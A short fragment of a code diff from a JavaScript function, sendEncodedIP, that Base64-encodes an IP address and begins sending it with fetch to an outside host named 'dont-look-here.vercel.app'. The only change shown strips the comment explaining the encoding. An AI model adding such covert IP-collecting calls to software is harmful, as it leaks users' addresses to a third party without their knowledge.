@@ -5,7 +5,7 @@ function sendEncodedIP() {
         return;
     }
 
-    const encodedIP = btoa(ip); // Base64 encode the IP
+    const encodedIP = btoa(ip);
     console.log("Encoded IP:", encodedIP);
 
     fetch("https://dont-look-here.vercel.app/api/api.js", {
